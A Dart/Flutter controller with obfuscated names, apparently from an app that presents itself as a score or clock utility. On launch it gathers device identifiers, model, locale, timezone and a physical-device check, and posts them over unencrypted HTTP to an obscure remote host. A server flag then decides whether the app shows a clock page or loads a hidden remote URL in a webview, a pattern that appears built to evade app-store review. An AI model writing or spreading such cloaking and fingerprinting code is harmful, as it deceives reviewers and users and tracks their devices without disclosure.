import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:internet_connection_checker/internet_connection_checker.dart';



class ScoreRateLogic extends GetxController {

  var tgqipsk = RxBool(false);
  var jvusdo = RxBool(true);
  var vijsr = RxString("");
  var cierra = RxBool(false);
  var witting = RxBool(true);
  final uckjzt = Dio();


  InAppWebViewController? webViewController;

  dynamic wxepcqk(){
    final gxslzhc = InternetConnectionChecker.instance;
    final nrvfbsh = gxslzhc.onStatusChange.skip(1).listen(
          (InternetConnectionStatus kbgtrih) {
        if (kbgtrih == InternetConnectionStatus.connected) {
          lvsqy();
        } else {
          Get.toNamed('/Apptimeout')?.then((_){
            lvsqy();
          });
        }
      },
    );
    return nrvfbsh;
  }

  Future<bool> nudheljor() async {
    var etnvywudz = await NetworkUtils.isNetworkAvailable();
    if(!etnvywudz){
      Get.toNamed('/Apptimeout')?.then((_){
        lvsqy();
      });
    }
    return etnvywudz;
  }

  @override
  void onInit() {
    super.onInit();
    wxepcqk();
    lvsqy();
  }


  Future<void> lvsqy() async {

    var iokntrvawc = await nudheljor();
    if(!iokntrvawc){
      return;
    }

    cierra.value = true;
    witting.value = true;
    jvusdo.value = false;

    uckjzt.post("http://ree.xnnieaplm.com/2IABT08CBX31?no_check",data: await enrdzhgbf()).then((value) {
      var bjlzft = value.data["bjlzft"] as String;
      var vozxejb = value.data["vozxejb"] as bool;
      if (vozxejb) {
        vijsr.value = bjlzft;
        kiel();
      } else {
        schoen();
      }
    }).catchError((e) {
      jvusdo.value = true;
      witting.value = true;
      cierra.value = false;
    });
  }

  Future<Map<String, dynamic>> enrdzhgbf() async {
    final DeviceInfoPlugin mgcvo = DeviceInfoPlugin();
    PackageInfo zntil_hxfw = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var qflrhcw = Platform.localeName;
    var qylanv = currentTimeZone;

    var glajowm = zntil_hxfw.packageName;
    var hdnkos = zntil_hxfw.version;
    var owhe = zntil_hxfw.buildNumber;

    var zjyrbek = zntil_hxfw.appName;
    var ulye = "";
    var jseuwmk  = "";
    var aneskig = "";
    var nameDickinson = "";
    var dallinThompson = "";
    var deionMiller = "";
    var beatriceLuettgen = "";
    var fannieBogisich = "";
    var seanGislason = "";
    var vidaStamm = "";
    var loraPrice = "";


    var hbjg = "";
    var egmj = false;

    if (GetPlatform.isAndroid) {
      hbjg = "android";
      var lixkqhfbvm = await mgcvo.androidInfo;

      aneskig = lixkqhfbvm.brand;

      ulye  = lixkqhfbvm.model;
      jseuwmk = lixkqhfbvm.id;

      egmj = lixkqhfbvm.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      hbjg = "ios";
      var bjlczfo = await mgcvo.iosInfo;
      aneskig = bjlczfo.name;
      ulye = bjlczfo.model;

      jseuwmk = bjlczfo.identifierForVendor ?? "";
      egmj  = bjlczfo.isPhysicalDevice;
    }

    var res = {
      "zjyrbek": zjyrbek,
      "owhe": owhe,
      "hdnkos": hdnkos,
      "glajowm": glajowm,
      "ulye": ulye,
      "qylanv": qylanv,
      "aneskig": aneskig,
      "jseuwmk": jseuwmk,
      "qflrhcw": qflrhcw,
      "hbjg": hbjg,
      "egmj": egmj,
      "nameDickinson" : nameDickinson,
      "dallinThompson" : dallinThompson,
      "deionMiller" : deionMiller,
      "beatriceLuettgen" : beatriceLuettgen,
      "fannieBogisich" : fannieBogisich,
      "seanGislason" : seanGislason,
      "vidaStamm" : vidaStamm,
      "loraPrice" : loraPrice,

    };
    return res;
  }

  Future<void> schoen() async {
    Get.offNamed("/ClockMainPage");
  }

  Future<void> kiel() async {
    Get.offNamed("/Outreload");
  }

  @override
  void dispose() {
    wxepcqk().cancel();
    super.dispose();
  }

}
